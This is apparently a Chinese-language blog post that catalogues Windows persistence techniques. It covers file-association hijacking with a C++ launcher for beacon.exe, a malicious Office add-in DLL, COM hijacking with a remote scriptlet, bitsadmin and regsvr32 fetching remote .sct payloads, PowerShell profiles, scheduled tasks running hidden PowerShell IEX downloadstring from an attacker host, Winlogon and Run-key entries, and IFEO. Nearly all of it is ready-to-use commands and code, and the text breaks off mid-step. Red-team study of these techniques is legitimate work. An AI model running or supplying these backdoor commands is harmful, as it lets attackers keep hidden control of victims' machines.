---
title: Persistence CMD
date: 2023-08-24T16:21:32+08:00
draft: true
url: /posts/2023-08-24/Persistence-CMD
tags:
  - Windows
  - Persistence
slug: English-Preview
---
> Persistence CMD


# 隐藏后门
## attrib

显示、设置或删除分配给文件或目录的属性

+ `{+\|-}s `：设置 (+) 或清除 (-) 系统文件属性。 如果文件使用此属性集，则必须先清除 该属性，然后才能更改该文件的任何其他属性。

+ `{+\|-}h `：设置 (+) 或清除 (-) 隐藏文件属性。 如果文件使用此属性集，则必须先清除 该属性，然后才能更改该文件的任何其他属性。

```cmd
attrib +h +s "<path to executable>"
```
# User
## 1. Shortcut Modification

原理是改写快捷方式的`target`，然后移动快捷方式移动到自启动目录中

参考：https://pentestlab.blog/2019/10/08/persistence-shortcut-modification/
## 2. Change Default File Association
### 原理

Windows中，每个文件扩展名都与一个默认程序关联，关联通过注册表实现

用户试图打开文件时，先在HKEY_USERS查找是否存在扩展名注册表项；如果没有，再到HKEY_CLASSES_ROOT查找

```cmd
# Global
HKEY_CLASSES_ROOT

# Local
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts
```
### assoc

显示或修改文件扩展名关联。 如果不带参数使用，assoc 将显示所有当前文件扩展名关联的列表

```cmd
# 此命令仅在 cmd.exe 中受支持，在 PowerShell 中不可用。 不过，你可以使用 cmd /c assoc 作为解决方法
assoc [<.[ext]>[=[<filetype>]]]
```

查看文件扩展名 .txt 的当前文件类型关联

```cmd
assoc .txt
```

要删除文件扩展名 .bak 的文件类型关联

```cmd
# 请确保在等号后添加空格
assoc .bak=
```
### ftype

显示或修改文件扩展名关联中使用的文件类型

```cmd
ftype [<filetype>[=[<opencommandstring>]]]
```

显示 txtfile 文件类型的当前打开命令字符串

```cmd
ftype txtfile
```

删除名为 example 的文件类型的打开命令字符串

```cmd
ftype example=
```
### 优雅的方法

仅使用“ ProxyApp ”应用程序和处理扩展程序默认程序的注册表项，即可仅对一个扩展程序手动执行劫持上线过程

> 编译环境：Visual Studio 2022
>
> 字符集：Unicode
>
> 权限：需要管理员权限修改注册表
#### main.cpp

```c
#include <stdio.h>
#include <Windows.h>
#include <psapi.h>

#include <string>

HANDLE create_new_process(IN const char* path, IN const char* cmd)
{
    STARTUPINFOA si;
    memset(&si, 0, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    si.wShowWindow = 0;

    PROCESS_INFORMATION pi;
    memset(&pi, 0, sizeof(PROCESS_INFORMATION));
    
    if (!CreateProcessA(
        path,
        (LPSTR) cmd,
        NULL, //lpProcessAttributes
        NULL, //lpThreadAttributes
        FALSE, //bInheritHandles
        DETACHED_PROCESS  | CREATE_NO_WINDOW,
        NULL, //lpEnvironment 
        NULL, //lpCurrentDirectory
        &si, //lpStartupInfo
        &pi //lpProcessInformation
    ))
    {
        return NULL;
    }
    return pi.hProcess;
}

void deploy_payload()
{
    char full_path[MAX_PATH] = { 0 };
    char calc_path[] = "C:\\ProgramData\\beacon.exe";
    //ExpandEnvironmentStringsW(LPCWSTR(calc_path), LPWSTR(full_path), MAX_PATH);
    ExpandEnvironmentStringsA(calc_path, full_path, MAX_PATH);
    create_new_process(full_path, NULL);
}

int main(int argc, char *argv[])
{
    std::string merged_args;
    if (argc >= 2) {
        for (int i = 1; i < argc; i++) {
            merged_args += std::string(argv[i]) + " ";
        }
        create_new_process(NULL, merged_args.c_str());
    }

    deploy_payload();
    return 0;
}
```
#### 注册表

```cmd
HKEY_CLASSES_ROOT\txtfile\shell\open\command

# 修改注册表的值
C:\ProgramData\ProxyApp.exe %SystemRoot%\system32\NOTEPAD.EXE %1

# 命令
reg.exe add "HKEY_CLASSES_ROOT\txtfile\shell\open\command" /ve /d "C:\ProgramData\ProxyApp.exe %SystemRoot%\system32\NOTEPAD.EXE %1" /f
```
## 3. Screensaver

屏幕保护程序是具有 .scr 文件扩展名的可执行文件，并通过 scrnsave.scr 实用程序执行

屏幕保护程序设置存储在注册表中，从攻击角度来看，被认为最有价值的值是：

```cmd
HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
```
### 利用方法

如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的；屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍；经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序

只能获得当前用户权限的shell，优点是不需要提权即可维持

```cmd
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\beacon.exe /f
reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
```

### 4. Office Templates

#### 默认文档

Microsoft Office 在`%APPDATA%`中包含一个存储所有模板的文件夹。Office启动时，基本模板都会用作默认文档

```cmd
%APPDATA%\Microsoft\Templates\Normal.dotm
```

将恶意宏嵌入到基本模板中，受害者可能会在一天中多次启动Office，这样就能达到权限维持的目的

#### Office 加载项

Office 加载项用于扩展 Office 程序的功能。当 Office 应用程序启动时，系统会检查存储加载项的文件夹，以便应用程序加载它们

可以执行以下命令来发现可以删除加载项的 Microsoft Word 的受信任位置

```powershell
Get-ChildItem "HKCU:\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations"
```

Office 加载项是 DLL 文件，根据应用程序具有不同的扩展名。例如，Word 为.wll ，Excel 为.xll

生成恶意DLL，移动到 Word 启动文件夹，恶意DLL每次 Word 启动时执行加载项

```cmd
%APPDATA%\Microsoft\Word\STARTUP
%APPDATA%\Microsoft\PowerPoint\STARTUP
%APPDATA%\Microsoft\Excel\STARTUP
```

这将导致 Microsoft Word 崩溃，从而向用户提供软件已被修改或需要重新安装的指示

#### 优雅的方法

一种优雅的方法是创建一个不会导致应用程序失败的自定义 DLL

DLL_PROCESS_ATTACH 会将 DLL 加载到当前进程（Word、Excel、PowerPoint 等）的虚拟地址空间中。加载 DLL 后，它将启动任意可执行文件，该可执行文件

将打开与命令和控制服务器的通信通道

```c
// Word 插件 – DLL
// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <stdlib.h>
 
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH: 
        system("start beacon.exe");
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

Microsoft Office 应用程序使用此密钥在开发阶段加载 DLL 以进行性能评估。使用命令提示符执行以下命令将创建指向本地存储的 DLL 文件的密钥

```cmd
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\tmp\pentestlab.dll
```

### 5. COM Hijacking

#### COM 组件对象模型

COM 是一个独立于平台的分布式面向对象的系统，用于创建可以交互的二进制软件组件。 COM 是 Microsoft 的 OLE (复合文档的基础技术，) 和 ActiveX (支持 Internet 的组件) 技术

官方文档：https://learn.microsoft.com/zh-cn/windows/win32/com/component-object-model--com--portal

#### CLSID Key

官方文档：https://learn.microsoft.com/zh-cn/windows/win32/com/clsid-key-hklm

```cmd
# 常见的CLSID

{20D04FE0-3AEA-1069-A2D8-08002B30309D} # 我的电脑
{450D8FBA-AD25-11D0-98A8-0800361B1103} # 我的文档
{645FF040-5081-101B-9F08-00AA002F954E} # 回收站
```

#### 劫持原理

一般来说，COM组件在被调用加载过程中会寻找注册表三个位置：

1. HKCU\Software\Classes\CLSID\{CLSID}
2. HKCR\CLSID\{CLSID}
3. HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Objects\{CLSID}

每一个CLSID键下会有一个基本子键`LocalServer32`或`InprocServer32`，它两的键值代表该COM组件提供的功能。其中`LocalServer32`的默认键值一般表示可执行文件(exe)的路径，而`InprocServer32`的默认键值表示动态链接库(DLL)的路径。也可以有其他的子键，`ThreadingModel`作用是标记该DLL的线程模型

所以，根据COM调用加载过程可以得出理论上可行的劫持方案：

- HKCR中有，而HKCU中没有，只需要在HKCU中注册即可劫持HKCR中的COM服务
- 修改掉`LocalServer32`或`InprocServer32`的键值
- 替换掉`LocalServer32`或`InprocServer32`的键值中的文件

基于这种思路，可以利用脚本[https://github.com/earthmanET/COM-Hijacker](https:) 用于枚举可能存在COM劫持的`LocalServer32`或`InprocServer32`

官方文档：https://learn.microsoft.com/zh-cn/windows/win32/com/inprocserver32

```cmd
# 常被利用的键值
InprocServer/InprocServer32 # 动态链接库文件(dll)的路径
LocalServer/LocalServer32 # 可执行文件(exe)的路径
TreatAs
ProgID

# 注册表项
HKEY_CURRENT_USER\Software\Classes\CLSID
HKEY_LOCAL_MACHINE\Software\Classes\CLSID
```

#### Discover COM Keys – Hijack

识别可用于进行 COM 劫持的 COM 密钥很简单，需要使用 [Process Monitor](https://download.sysinternals.com/files/ProcessMonitor.zip) 来发现缺少 CLSID 且不需要提升权限 (HKCU) 的 COM 服务

Process Monitor 可以配置以下过滤器

```cmd
Operation is RegOpenKey
Result is NAME NOT FOUND
Path ends with InprocServer32
Exclude if path starts with HKLM
```

导出结果之后，使用[acCOMplice](https://github.com/nccgroup/acCOMplice)的 PowerShell 脚本提取CSV中的可劫持COM Keys

```powershell
Import-Module COMHijackToolkit.ps1
Extract-HijackableKeysFromProcmonCSV -CSVfile .\result.CSV
```

或者直接检索系统上存在的缺失库及其 CLSID

```powershell
Find-MissingLibraries
```

PowerShell 脚本

```powershell
$inproc = gwmi Win32_COMSetting | ?{ $_.LocalServer32 -ne $null }
$inproc | ForEach {$_.LocalServer32} > values.txt
$paths = gc .\values.txt
foreach ($p in $paths){$p;cmd /c dir $p > $null}
```

同样，以下 PowerShell 代码也可以枚举 InprocServer32 类

```powershell
$inproc = gwmi Win32_COMSetting | ?{ $_.InprocServer32 -ne $null }
$paths = $inproc | ForEach {$_.InprocServer32}
foreach ($p in $paths){$p;cmd /c dir $p > $null}
```

#### Discover COM Keys – Scheduled Task

PowerShell 脚本 ( [Get-ScheduledTaskComHandler](https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Get-ScheduledTaskComHandler.ps1) )，它可以检查主机上所有在用户登录时执行的计划任务，并找出哪些容易受到 COM 劫持

```powershell
Import-Module .\Get-ScheduledTaskComHandler.ps1
Get-ScheduledTaskComHandler
```

参数“ **PersistenceLocations** ”将检索容易受到 COM 劫持的计划任务，这些任务可用于持久性，并且不需要提升权限。CLSID 和关联的 DLL 也将显示在输出中

```powershell
Get-ScheduledTaskComHandler -PersistenceLocations
```

调用“ *schtasks* ”检索文件的内容

```powershell
schtasks /query /FO list | findstr "CacheTask"

# 获取 CLSID
schtasks /query /XML /TN "\Microsoft\Windows\Wininet\CacheTask"
schtasks /query /XML /TN "\Microsoft\Windows\CertificateServicesClient\UserTask"

```

#### InprocServer32

“ **InprocServer32** ”（进程内服务器）注册表项指示 COM 库位于磁盘上的位置并定义线程模型

为 "CacheTask" 重新创建注册表项结构并指向任意 DLL：上传DLL；设置子键“ **InprocServer32** ”指向 DLL 的位置

由于“ **CacheTask** ”默认在登录期间启动，因此任何用户代码都将在登录期间永久执行（持久性）

```cmd
# Usage
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InProcServer32

HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InProcServer32

# Windows 7 需要 Administrator 权限 ；Windows 10 需要 TrustedInstaller 权限
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}\InProcServer32 /v "" /t REG_SZ /d "<path to dll>" /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{0358b920-0ac7-461f-98f4-58e32cd89148}\InProcServer32" /v "" /t REG_SZ /d "c:\shell.dll" /f
```

“ **ScriptletURL** ”注册表项定义了调用 COM 类时将获取并执行的任意 .sct 文件的远程位置，执行无文件持久化

```scriptlet
<?XML version="1.0"?>
<scriptlet>
 
<registration
    description="Pentest.Lab"
    progid="Pentest.Lab"
    version="1"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
    >
</registration>
 
<script language="JScript">
<![CDATA[
 
        var r = new ActiveXObject("WScript.Shell").Run("pentestlab.exe");
     
     
]]>
</script>
 
</scriptlet>

# Usage
键值设置为：http://IP/shell.sct
```

执行以下命令将调用 COM 类并直接执行有效负载

```cmd
# Usage
rundll32.exe -sta {CLSID}

rundll32.exe -sta {0358b920-0ac7-461f-98f4-58e32cd89148}
```

#### LocalServer32

**LocalServer32**注册表项指定外部 COM 对象在系统上的位置。这些通常是具有可执行文件形式的应用程序。

以下 COM 类 ID 已在枚举可劫持密钥期间检索到，可用于执行任意可执行文件

```powershell
HKEY_CLASSES_ROOT\CLSID\{45EAE363-122A-445A-97B6-3DE890E786F8}\LocalServer32
```

将应用程序的默认值替换为任意可执行文件实现劫持，还需要通过执行以下 PowerShell 命令来激活 ClassID，否则 COM 对象将被禁用

```powershell
[activator]::CreateInstance([type]::GetTypeFromCLSID("45EAE363-122A-445A-97B6-3DE890E786F8"))
```

#### TreatAs/ProgID

“ *TreatAs* ”是一个注册表项，它允许一个 CLSID 被另一个 CLSID 模拟。这可用于将 COM 对象重定向到另一个 COM 对象

1. 使用所选的目标 COM 服务器在 HKCU 注册表配置单元中创建恶意 CLSID。
2. 通过添加指向恶意 CLSID 的“ *TreatAs* ”子项来劫持合法 CLSID 。

“ *ProgID* ”是 COM 对象的友好名称，它不是唯一的。以下注册表项将 ProgID 解析为 CLSID。

- HKCU\Software\Classes
- HKLM\Software\Classes

这意味着当应用程序（客户端）激活 COM 对象（类）时，操作系统将通过最初读取以下注册表位置来解析关联的“ *ProgID ”：*

- HKCU\Software\Classes\ProgID

### 6. bitsadmin

Microsoft 提供了一个名为“ **bitsadmin** ”的二进制文件和 PowerShell cmdlet，用于创建和管理文件传输

#### 基础命令

##### 显示所有用户的 BITS 任务列表

```cmd
# 包括活动任务和已完成任务
bitsadmin /list /allusers

# 更详细的信息
bitsadmin /list /allusers /verbose
```

##### 删除任务

```cmd
bitsadmin /cancel <Job Name>
```

#### 下载方式

##### Cmd

```cmd
bitsadmin /transfer backdoor /download /priority high http://IP:Port/Filename <path to executable>
```

##### PowerShell

```powershell
Start-BitsTransfer -Source "http://IP:Port/Filename" -Destination "<path to executable>"
```

#### 利用方法

将文件写入磁盘后，可以通过从“ **bitsadmin** ”实用程序执行以下命令来实现持久化

1. 创建参数需要作业的名称
2. addfile需要文件的远程位置和本地路径
3. SetNotifyCmdLine将执行的命令
4. SetMinRetryDelay定义回调的时间（以秒为单位）
5. resume参数将运行位作业。

```cmd
bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://IP:Port/Filename"  "<path to executable>"
bitsadmin /SetNotifyCmdLine backdoor C:\tmp\beacon.exe NUL
bitsadmin /SetMinRetryDelay "backdoor" 60
bitsadmin /resume backdoor
```

##### SetNotifyCmdLine

**SetNotifyCmdLine** 参数还可用于通过[regsvr32](https://pentestlab.blog/2017/05/11/applocker-bypass-regsvr32/)实用程序从远程位置执行 scriptlet。这种方法的好处是不接触磁盘，可以绕过白名单

```cmd
# Usage
bitsadmin /setnotifycmdline <job> <program_name> [program_parameters]
bitsadmin /resume backdoor

# 创建一个新的Job,命名为Windows Update
bitsadmin /Create "Windows Update"

# 指定一个下载任务和下载的地址
bitsadmin /AddFile "Windows Update" "http://192.168.19.129:8080/hXvPWuHBr.sct" "C:\scrobj.dll"

# 设置触发事件的条件
bitsadmin /SetNotifyFlags "Windows Update" 1

# 设置作业完成数据传输或作业进入状态将运行的命令行程序
bitsadmin /SetNotifyCmdLine "Windows Update" "%COMSPEC%" "cmd.exe /c bitsadmin.exe /complete \"Windows Update\" && start /B regsvr32 /s /n /u /i:http://192.168.19.129:8080/hXvPWuHBr.sct scrobj.dll"

# 设置下载任务出错时重传的延迟
bitsadmin /SetMinRetryDelay "Windows Update" 60

# 添加自定义的HTTP头
bitsadmin /SetCustomHeaders "Windows Update" "Caller:%USERNAME%@%COMPUTERNAME"

# 激活新的任务
bitsadmin /Resume "Windows Update" 

# 使用schtasks命令建立计划任务来加载bitsadmin执行”Windows Update“
schtasks /Create /TN "Windows Update" /TR "%WINDIR%\system32\bitsadmin.exe /resume \"Windows Update\"" /sc minute /MO 30 /ED(此任务的最后一次运行时间) 2023/08/30 /ET 00:00(最后一次的运行时间) /Z(在任务运行完毕后删除任务) /IT(标志此任务只有在登录情况下才运行) /RU %USERNAME%(指定运行的用户账户)  
```

### 7. PowerShell Profile

PowerShell 配置文件脚本存储在“ **WindowsPowerShell** ”文件夹中，默认情况下该文件夹对用户隐藏

如果有效负载已放入磁盘，则可以使用“ **Start-Process** ”cmdlet 来指向可执行文件的位置

使用 “ **Test-Path $profile** ” 确定当前用户是否存在配置文件

如果配置文件不存在，命令“ **New-Item -Path $profile -Type File -Force** ”将为当前用户创建配置文件，“ **Out-File** ”将使用新内容重写配置文件

```powershell
echo $profile
Test-Path $profile
New-Item -Path $profile -Type File –Force
$string = 'Start-Process "C:\beacon.exe"'
$string | Out-File -FilePath "C:\Users\administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

与启动进程类似，“ **Invoke-Item** ”cmdlet 可用于执行项目的默认操作，即运行文件、打开应用程序等

```powershell
echo $profile
Test-Path $profile
New-Item -Path $profile -Type File –Force
Add-Content $profile "Invoke-Item C:\launcher.bat"
$string | Out-File -FilePath "C:\Users\administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

“ **Invoke-Command** ”可以执行命令，regsvr32可以用作无文件上线，并且可以从远程位置执行 scriptlet

```powershell
echo $profile
Test-Path $profile
New-Item -Path $profile -Type File –Force
$string = 'Invoke-Command -ScriptBlock { regsvr32 /s /n /u /i:http://IP:Port/jWcEbr.sct scrobj.dll }'
$string | Out-File -FilePath "C:\Users\administrator\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1" -Append
```

## 0x03 Administrator

### 1. 计划任务

#### schtasks

将命令和程序计划为定期运行或在特定时间运行、在计划中添加和删除任务、按需启动和停止任务，以及显示和更改计划任务

##### 创建计划任务

```cmd
schtasks /create 
```

##### 删除计划任务

```cmd
schtasks /delete
```

##### 运行计划任务

```cmd
schtasks /run 
```

##### 查询计划任务

```cmd
schtasks /query 
```



```cmd
schtasks /change 
schtasks /end 
```

#### 利用方法

##### 创建定时计划任务

+ `<Task Name>`：计划任务的名称。
+ `<command>`：要执行的命令或脚本的路径。
+ `<starttime>`：指定运行任务的开始时间。时间格式为 HH:mm (24 小时时间)，例如 14:30 表示2:30 PM。如果未指定 /ST，则默认值为当前时间。/SC ONCE 必需有此选项。
+ `<startdate>`：计划任务的开始日期。可以使用当前日期，例如YYYY/MM/DD

~~~cmd
schtasks /create /tn <Task Name> /tr <command> /sc once /st <starttime> /sd <startdate>

# Usages
schtasks /create /tn <Task Name> /tr "<path to executable>" /sc once /st %TIME%

schtasks /create /tn "MyTask" /tr "C:\Users\Public\Downloads\beacon.exe" /sc once /st 18:01 /sd 2023/08/21
~~~

##### 计划任务在系统空闲时运行

“空闲时”计划类型计划任务在 /i 参数指定的时间内，没有用户活动时运行。 在“空闲时”计划类型中，需要用到 /sc onidle 参数和 /i 参数。 /sd（开始日期）为可

选，默认值为当前日期

使用必需的 `/i` 参数指定计算机必须在任务开始前的 10 分钟处于空闲状态

```cmd
# Usages
schtasks /create /tn <Task Name> /tr "<path to executable>" /sc onidle /i <time> 

schtasks /create /tn MyApp /tr "c:\apps\myapp.exe" /sc onidle /i 10 
```

##### 计划运行多个程序的任务

每个任务仅运行一个程序。 但是，可以创建运行多个程序的批处理文件，然后计划运行批处理文件的任务
1. 使用文本编辑器创建一个批处理文件，其中包含所需的 .exe 文件的名称和完全限定路径

```cmd
# Usages
# <Terminal Name> 不能相同
cmd /c start /b "<Terminal Name>" "<path to executable>" && cmd /c start /b "<Terminal Name>" "<path to executable>"

cmd /c start /b "AppOne" "One.exe" && cmd /c start /b "AppTwo" "Two.exe"
```

2. 将文件另存为 MyApps.bat，打开 schtasks.exe，然后通过键入以下内容创建运行 MyApps.bat  的任务

```cmd
# Usages
schtasks /create /tn <Task Name> /tr "<path to executable>" /sc onlogon

schtasks /create /tn MyApps /tr "C:\MyApps.bat" /sc onlogon
```

##### 查询计划任务

- `/tn <Task Name>`：仅显示指定名称的计划任务
- `/fo <format>`：以指定格式输出结果。例如，`/fo table`以表格形式输出结果，`/fo list`以列表形式输出结果
- `/v`：显示详细信息，包括触发器、操作和状态等

~~~cmd
# 查询全部计划任务
schtasks /query

# Usages:
schtasks /query /tn <Task Name> /v

# 使用/fo list参数以列表形式输出计划任务信息
schtasks /query /fo list

# 获取特定计划任务的详细信息，可以使用/tn <Task Name>参数来指定任务名称
schtasks /query /fo list /tn <Task Name>
~~~

##### 常用上线命令

```cmd
#(X64) - On System Start
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onstart /ru System
 
#(X64) - On User Idle (30mins)
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onidle /i 30
 
#(X86) - On User Login
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onlogon /ru System
  
#(X86) - On System Start
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onstart /ru System

#(X86) - On User Idle (30mins)
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onidle /i 30
```

##### 到期启动并删除

有效负载的执行也可以在特定时间发生，并且可以具有到期日期和自删除功能

```cmd
# Usage
# /RU %USERNAME%：可选项
schtasks /CREATE /TN <Task Name> /TR "cmd.exe /c start /b <path to executable>" /SC minute /MO 1 /ED <Start Time:yyyy/mm/dd> /ET <End Time:hh:mm> /Z /IT /RU %USERNAME%

schtasks /CREATE /TN "A" /TR "cmd.exe /c start /b <path to executable>" /SC minute /MO 1 /ED 2023/08/29 /ET 17:27 /Z /IT

schtasks /CREATE /TN "Windows Update" /TR "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /SC minute /MO 1 /ED 04/11/2019 /ET 06:53 /Z /IT
```

##### 日志触发计划任务

如果为目标事件启用了事件日志记录，则可以在特定 Windows 事件上触发任务

```cmd
# 登录日志ID：4624
wevtutil qe Security /f:text /c:1 /q:"Event[System[(EventID=4624)]]

# 注销日志ID：4634
wevtutil qe Security /f:text /c:1 /q:"Event[System[(EventID=4634)]]

# Usage
schtasks /Create /TN <Task Name> /TR "cmd.exe /c start /b <path to executable>" /SC ONEVENT /EC Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"

schtasks /Create /TN OnLogOff /TR "cmd.exe /c start /b <path to executable>" /SC ONEVENT /EC Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"

schtasks /Query /tn OnLogOff /fo List /v
```

### 2. Winlogon Helper

#### 原理

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`的作用是指定用户登录时 Winlogon 运行的程序

默认情况下，Winlogon 运行 Userinit.exe（运行登录脚本），重新建立网络连接，然后启动 Windows 用户界面 Explorer.exe

可以更改此条目的值以添加或删除程序

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit

# Usage
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /d "Userinit.exe, <path to executable>" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, <path to executable>" /f

# PowerShell 使用 Set-ItemProperty cmdlet 修改现有注册表项
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, <path to executable>" -Force
Set-ItemProperty "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Shell" "explorer.exe, <path to executable>" -Force
```

`Notify `注册表项通常出现在较旧的操作系统（Windows 7 之前的操作系统）中，它指向处理 Winlogon 事件的通知包 DLL 文件

使用任意 DLL 替换此注册表下的DLLName将导致 Windows 在登录期间执行它

```cmd
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify

# Usage
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\cscdll" /v DLLName /d "<path to dll>" /f
```

#### 利用方法

Userinit 键默认的值为`C:\Windows\system32\userinit.exe`，修改注册表项`Userinit`以包含任意负载将导致系统在 Windows 登录期间运行两个可执行文件

```cmd
# Usage
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,<path to executable>"

# 执行程序
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,C:\Users\admin\Documents\backdoor.exe"

# 执行命令
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\system32\userinit.exe,<command>"
```

### 3. 启动项

#### 开始菜单启动项

将后门程序放到上面的用户目录中，目标用户重新登录时便会启动后门程序

```cmd
# 当前用户目录  
%HOMEPATH%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

# 系统目录（需要管理员权限）  
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

#### 注册表启动项

```cmd
# 当前用户键值  
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce  
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce

# 服务器键值 管理员权限
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
```

##### RunOnce 注册键

用户登录时，所有程序按顺序自动执行，在 Run 启动项之前执行，但只能运行一次，执行完毕后会自动删除；用户重新登录时，便会启动后门程序

```cmd
# Usage
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "<name>" /t REG_SZ /F /D "<path to executable>"

REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "backdoor" /t REG_SZ /F /D "C:\beacon.exe"
```

#### 其他

```cmd
# executable 管理员权限
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001

# dll 管理员权限
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend

# Usage
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v Pentestlab /t REG_SZ /d "C:\tmp\beacon.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v Pentestlab /t REG_SZ /d "C:\tmp\beacon.dll"
```

### 4. 映像劫持

#### 原理

通过修改注册表路径IFEO（Image File Execution Options）的exe程序，然后进行重定向执行后门程序的过程

##### 修改Debugger值

1. 运行某exe程序时候，系统会在注册表`Image File Execution Options`中寻找是否存在exe的项

```cmd
# 注册表路径
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
```

2. 在IFEO中新添加一个项，取名sethc.exe

```cmd
# Usage
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /f
```

3. 新建一个字符串值Debugger，键值修改为后门存在的路径表，连续五次shitf触发sethc.exe程序，系统就会重定向到指定路径，执行beacon.exe成功上线

```cmd
